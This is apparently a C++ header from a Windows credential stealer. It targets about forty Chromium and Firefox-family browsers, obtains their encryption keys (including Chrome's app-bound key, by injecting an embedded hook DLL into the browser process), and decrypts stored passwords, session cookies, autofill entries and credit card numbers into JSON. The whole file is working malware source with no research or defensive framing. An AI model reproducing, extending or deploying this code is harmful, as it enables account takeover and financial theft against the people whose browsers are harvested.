#pragma once
#include "crypt.hpp"
#include "dbcopy.hpp"
#include <shlobj.h>
#include <sqlite3.h>
#include <fstream>
#include <filesystem>
#include <cstring>
#include <vector>
#include <nlohmann/json.hpp>
namespace fs = std::filesystem;
using json = nlohmann::json;
#pragma comment(lib,"shell32.lib")

struct BrowserDef {
    std::string name;
    std::wstring localPath;
    std::wstring roamPath;
    bool isFirefox;
};

inline std::vector<BrowserDef> GetBrowsers() {
    return {
        { "Chrome",  L"Google\\Chrome\\User Data",           L"", false },
        { "Edge",    L"Microsoft\\Edge\\User Data",          L"", false },
        { "Brave",   L"BraveSoftware\\Brave-Browser\\User Data", L"", false },

        { "ChromeBeta",   L"Google\\Chrome Beta\\User Data",     L"", false },
        { "ChromeDev",    L"Google\\Chrome Dev\\User Data",      L"", false },
        { "ChromeCanary", L"Google\\Chrome SxS\\User Data",      L"", false },
        { "EdgeBeta",     L"Microsoft\\Edge Beta\\User Data",    L"", false },
        { "EdgeDev",      L"Microsoft\\Edge Dev\\User Data",     L"", false },
        { "EdgeCanary",   L"Microsoft\\Edge SxS\\User Data",     L"", false },
        { "BraveBeta",    L"BraveSoftware\\Brave-Browser Beta\\User Data",    L"", false },
        { "BraveNightly", L"BraveSoftware\\Brave-Browser Nightly\\User Data", L"", false },

        { "Opera",    L"Opera Software\\Opera Stable",        L"", false },
        { "OperaGX",  L"Opera Software\\Opera GX Stable",     L"", false },
        { "OperaBeta", L"Opera Software\\Opera Beta",         L"", false },
        { "Vivaldi",  L"Vivaldi\\User Data",                  L"", false },
        { "VivaldiSnapshot", L"Vivaldi\\User Data Snapshot",  L"", false },
        { "Yandex",   L"Yandex\\YandexBrowser\\User Data",    L"", false },
        { "ComodoDragon", L"Comodo\\Dragon\\User Data",       L"", false },
        { "Torch",    L"Torch\\User Data",                    L"", false },
        { "Epic",     L"Epic Privacy Browser\\User Data",     L"", false },
        { "Arc",      L"Arc\\User Data",                      L"", false },
        { "Cent",     L"CentBrowser\\User Data",              L"", false },
        { "Thorium",  L"Thorium\\User Data",                  L"", false },
        { "Iridium",  L"Iridium\\User Data",                  L"", false },
        { "Slimjet",  L"Slimjet\\User Data",                  L"", false },
        { "Kiwi",     L"Kiwi\\User Data",                     L"", false },
        { "Whale",    L"Naver\\NaverWhale\\User Data",        L"", false },
        { "CocCoc",   L"CocCoc\\User Data",                   L"", false },
        { "Avast",    L"AVAST Software\\Browser\\User Data",  L"", false },
        { "AVG",      L"AVG\\Browser\\User Data",             L"", false },
        { "Comodo",   L"Comodo\\Internet Security\\User Data", L"", false },
        { "360",      L"360\\360Browser\\User Data",          L"", false },
        { "QQ",       L"Tencent\\QQBrowser\\User Data",       L"", false },
        { "Baidu",    L"Baidu\\BaiduBrowser\\User Data",      L"", false },
        { "UC",       L"UCBrowser\\User Data",                L"", false },
        { "Falkon",   L"Falkon\\User Data",                   L"", false },

        { "Firefox", L"", L"Mozilla\\Firefox\\Profiles",     true  },
        { "Waterfox", L"", L"Waterfox\\Profiles",            true  },
        { "PaleMoon", L"", L"moonchild productions\\Pale Moon\\Profiles", true },
    };
}

inline std::string WstrToUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int sz = WideCharToMultiByte(CP_UTF8,0,w.c_str(),-1,nullptr,0,nullptr,nullptr);
    std::string s(sz-1,' ');
    WideCharToMultiByte(CP_UTF8,0,w.c_str(),-1,s.data(),sz,nullptr,nullptr);
    return s;
}

inline std::wstring GetLocalApp() {
    wchar_t buf[MAX_PATH]{};
    SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, buf);
    return buf;
}
inline std::wstring GetRoaming() {
    wchar_t buf[MAX_PATH]{};
    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, buf);
    return buf;
}

inline std::string CopyDb(const fs::path& src) {
    auto tmp = fs::temp_directory_path() / (std::to_string(GetTickCount64()) + ".tmp");
    if (dbcopy::CopyLockedDb(src, tmp)) return tmp.string();
    std::error_code ec; fs::remove(tmp, ec);
    return {};
}

#include "appbound.hpp"
#include "hook_dll.h"
#include <utility>

inline std::vector<uint8_t> B64Decode(const std::string& b64) {
    static const std::string t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<uint8_t> out; out.reserve(b64.size()*3/4);
    int v=0, bits=0;
    for (char c : b64) {
        int idx = (int)t.find(c);
        if (idx == -1) continue;
        v = (v<<6)|idx; bits+=6;
        if (bits>=8) { bits-=8; out.push_back((v>>bits)&0xFF); }
    }
    return out;
}

struct ElevIds {
    const wchar_t* clsid;
    const wchar_t* iidV2;
    const wchar_t* iidV1;
    const wchar_t* exeName;
};
inline bool GetElevIds(const std::string& browser, ElevIds& o) {
    struct { const char* name; ElevIds ids; } t[] = {
        { "Chrome",   { L"{708860E0-F641-4611-8895-7D867DD3675B}",
                        L"{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
                        L"{463ABECF-410D-407F-8AF5-0DF35A005CC8}", L"chrome.exe" } },
        { "Edge",     { L"{1FCBE96C-1697-43AF-9140-2897C7C69767}",
                        L"{8F7B6792-784D-4047-845D-1782EFBEF205}",
                        L"{C9C2B807-7731-4F34-81B7-44FF7779522B}", L"msedge.exe" } },
        { "Brave",    { L"{576B31AF-6369-4B6B-8560-E4B203A97A8B}",
                        L"{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
                        L"{F396861E-0C8E-4C71-8256-2FAE6D759CE9}", L"brave.exe" } },
    };
    for (auto& r : t)
        if (browser == r.name) { o = r.ids; return true; }
    return false;
}

inline std::vector<uint8_t> GetAppBoundKey(const fs::path& userDataDir,
                                           const std::string& browser = "Chrome") {
    fs::path ls = userDataDir / "Local State";
    if (!fs::exists(ls)) return {};

    ElevIds ids;
    if (GetElevIds(browser, ids)) {
        fs::path exe = userDataDir.parent_path() / "Application" / ids.exeName;
        std::wstring exeHint = fs::exists(exe) ? exe.wstring() : std::wstring();
        auto key = abk::GetAppBoundKeyInjected(
            HOOK_DLL, HOOK_DLL_SIZE,
            ids.exeName, exeHint, ls.wstring(),
            ids.clsid, ids.iidV2, ids.iidV1);
        if (key.size() == 32) return key;
        abk::Cleanup();
    }

    std::ifstream f(ls); std::string content((std::istreambuf_iterator<char>(f)), {});
    auto j = json::parse(content, nullptr, false);
    if (j.is_discarded()) return {};
    if (!j.contains("os_crypt") || !j["os_crypt"].contains("app_bound_encrypted_key")) return {};
    auto raw = B64Decode(j["os_crypt"]["app_bound_encrypted_key"].get<std::string>());
    if (raw.size() < 8) return {};
    if (memcmp(raw.data(), "APPB", 4) != 0) return {};
    std::vector<uint8_t> cur(raw.begin()+4, raw.end());
    for (int layer = 0; layer < 2; ++layer) {
        auto out = DpapiDecrypt(cur);
        if (out.empty()) return {};
        cur = std::move(out);
        if (cur.size() == 32) return cur;
    }
    if (cur.size() == 32) return cur;
    return {};
}

inline std::vector<uint8_t> GetMasterKey(const fs::path& userDataDir) {
    fs::path ls = userDataDir / "Local State";
    if (!fs::exists(ls)) return {};
    std::ifstream f(ls); std::string content((std::istreambuf_iterator<char>(f)), {});
    auto j = json::parse(content, nullptr, false);
    if (j.is_discarded()) return {};
    std::string b64 = j["os_crypt"]["encrypted_key"].get<std::string>();
    auto out = B64Decode(b64);
    if (out.size()<5) return {};
    std::vector<uint8_t> enc(out.begin()+5, out.end());
    return DpapiDecrypt(enc);
}

inline std::string DecryptBlob(const std::vector<uint8_t>& raw,
                               const std::vector<uint8_t>& key) {
    if (key.size() != 32 || raw.size() < 31) return {};
    std::vector<uint8_t> iv(raw.begin()+3, raw.begin()+15);
    std::vector<uint8_t> tag(raw.end()-16, raw.end());
    std::vector<uint8_t> ct(raw.begin()+15, raw.end()-16);
    auto plain = AesGcmDecrypt(key, iv, tag, ct);
    return std::string(plain.begin(), plain.end());
}

inline std::string DecryptPass(const std::vector<uint8_t>& raw,
                               const std::vector<uint8_t>& masterKey,
                               const std::vector<uint8_t>& appBoundKey = {}) {
    if (raw.size() > 3 && raw[0]=='v' && raw[1]=='1' && raw[2]=='0') {
        std::string p = DecryptBlob(raw, masterKey);
        if (!p.empty()) return p;
        return DecryptBlob(raw, appBoundKey);
    }
    if (raw.size() > 3 && raw[0]=='v' && raw[1]=='2' && raw[2]=='0') {
        std::string p = DecryptBlob(raw, appBoundKey);
        if (!p.empty()) return p;
        return DecryptBlob(raw, masterKey);
    }
    auto dec = DpapiDecrypt(raw);
    return std::string(dec.begin(), dec.end());
}

inline sqlite3* OpenDb(const std::string& path) {
    sqlite3* db = nullptr;
    if (sqlite3_open(path.c_str(), &db) != SQLITE_OK) { sqlite3_close(db); return nullptr; }
    sqlite3_busy_timeout(db, 2000);
    return db;
}

inline json ExtractLogins(const fs::path& loginData, const std::vector<uint8_t>& mk,
                          const std::vector<uint8_t>& abk = {},
                          const std::string& profile = {}) {
    json out = json::array();
    std::string tmp = CopyDb(loginData);
    if (tmp.empty()) return out;
    sqlite3* db = OpenDb(tmp);
    if (!db) { fs::remove(tmp); return out; }
    const char* sql =
        "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user=0";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            std::string url  = (const char*)sqlite3_column_text(stmt, 0);
            std::string user = (const char*)sqlite3_column_text(stmt, 1);
            const uint8_t* enc = (const uint8_t*)sqlite3_column_blob(stmt, 2);
            int encLen = sqlite3_column_bytes(stmt, 2);
            std::vector<uint8_t> raw(enc, enc+encLen);
            std::string pass = DecryptPass(raw, mk, abk);
            if (!url.empty() && !pass.empty())
                out.push_back({{"url",url},{"user",user},{"pass",pass},{"profile",profile}});
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    fs::remove(tmp);
    return out;
}

inline json ExtractCookies(const fs::path& cookieDb, const std::vector<uint8_t>& mk,
                            const std::string& browser, const std::string& profile,
                            const std::vector<uint8_t>& abk = {}) {
    json out = json::array();
    std::string tmp = CopyDb(cookieDb);
    if (tmp.empty()) return out;
    sqlite3* db = OpenDb(tmp);
    if (!db) { fs::remove(tmp); return out; }
    const char* sql =
        "SELECT host_key,name,value,encrypted_value,path,expires_utc,is_secure FROM cookies";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            std::string host  = (const char*)sqlite3_column_text(stmt, 0);
            std::string name  = (const char*)sqlite3_column_text(stmt, 1);
            const char* plain = (const char*)sqlite3_column_text(stmt, 2);
            const uint8_t* enc = (const uint8_t*)sqlite3_column_blob(stmt, 3);
            int encLen = sqlite3_column_bytes(stmt, 3);
            std::vector<uint8_t> raw(enc, enc+encLen);
            std::string val;
            if (encLen > 0) val = DecryptPass(raw, mk, abk);
            if (val.empty() && plain && *plain) val = plain;
            if (val.empty()) continue;
            int64_t exp     = sqlite3_column_int64(stmt, 5);
            int sec         = sqlite3_column_int(stmt, 6);
            out.push_back({{"browser",browser},{"profile",profile},
                {"host",host},{"name",name},{"value",val},
                {"path",(const char*)sqlite3_column_text(stmt,4)},
                {"expires",exp},{"secure",sec!=0}});
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db); fs::remove(tmp);
    return out;
}

inline json ExtractAutofill(const fs::path& webData, const std::string& profile = {}) {
    json out = json::array();
    std::string tmp = CopyDb(webData);
    if (tmp.empty()) return out;
    sqlite3* db = OpenDb(tmp);
    if (!db) { fs::remove(tmp); return out; }
    const char* sql = "SELECT name, value FROM autofill";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            out.push_back({
                {"field",(const char*)sqlite3_column_text(stmt,0)},
                {"value",(const char*)sqlite3_column_text(stmt,1)},
                {"profile",profile}
            });
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db); fs::remove(tmp);
    return out;
}

inline json ExtractCards(const fs::path& webData, const std::vector<uint8_t>& mk,
                         const std::string& browser, const std::string& profile,
                         const std::vector<uint8_t>& abk = {}) {
    json out = json::array();
    std::string tmp = CopyDb(webData);
    if (tmp.empty()) return out;
    sqlite3* db = OpenDb(tmp);
    if (!db) { fs::remove(tmp); return out; }
    const char* sql =
        "SELECT name_on_card, expiration_month, expiration_year, "
        "card_number_encrypted FROM credit_cards";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const uint8_t* enc = (const uint8_t*)sqlite3_column_blob(stmt, 3);
            int encLen = sqlite3_column_bytes(stmt, 3);
            if (encLen <= 0) continue;
            std::vector<uint8_t> raw(enc, enc + encLen);
            std::string num = DecryptPass(raw, mk, abk);
            if (num.empty()) continue;
            const char* mo = (const char*)sqlite3_column_text(stmt, 1);
            const char* yr = (const char*)sqlite3_column_text(stmt, 2);
            out.push_back({{"browser", browser}, {"profile", profile},
                {"name",   (const char*)sqlite3_column_text(stmt, 0)},
                {"number", num},
                {"exp",    std::string(mo ? mo : "") + "/" + std::string(yr ? yr : "")}});
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    fs::remove(tmp);
    return out;
}

inline json GrabChromium(const BrowserDef& br) {
    json result; result["browser"] = br.name;
    result["logins"] = json::array();
    result["cookies"] = json::array();
    result["autofill"] = json::array();
    result["cards"] = json::array();

    fs::path base = fs::path(GetLocalApp()) / br.localPath;
    if (!fs::exists(base)) return result;

    auto masterKey = GetMasterKey(base);
    auto appBoundKey = GetAppBoundKey(base, br.name);

    std::vector<fs::path> profiles;
    profiles.push_back(base / "Default");
    for (auto& e : fs::directory_iterator(base)) {
        auto fn = e.path().filename().string();
        if (fn.find("Profile") == 0) profiles.push_back(e.path());
    }

    for (auto& pdir : profiles) {
        if (!fs::exists(pdir)) continue;
        std::string pname = pdir.filename().string();

        fs::path ld = pdir / "Login Data";
        if (fs::exists(ld))
            for (auto& x : ExtractLogins(ld, masterKey, appBoundKey, pname)) result["logins"].push_back(x);

        fs::path ck = pdir / "Network" / "Cookies";
        if (!fs::exists(ck)) ck = pdir / "Cookies";
        if (fs::exists(ck))
            for (auto& x : ExtractCookies(ck, masterKey, br.name, pname, appBoundKey))
                result["cookies"].push_back(x);

        fs::path wd = pdir / "Web Data";
        if (fs::exists(wd)) {
            for (auto& x : ExtractAutofill(wd, pname)) result["autofill"].push_back(x);
            for (auto& x : ExtractCards(wd, masterKey, br.name, pname, appBoundKey))
                result["cards"].push_back(x);
        }
    }
    return result;
}

#include "firefox.hpp"

inline bool HasAnyData(const json& b) {
    return !b.value("logins", json::array()).empty() ||
           !b.value("cookies", json::array()).empty() ||
           !b.value("autofill", json::array()).empty() ||
           !b.value("cards", json::array()).empty();
}

inline json GrabAllBrowsers() {
    json out = json::array();
    for (auto& br : GetBrowsers()) {
        json r;
        if (br.isFirefox) {
            r = GrabFirefox(br.name, br.roamPath);
        } else {
            r = GrabChromium(br);
        }
        if (HasAnyData(r)) out.push_back(r);
    }
    return out;
}
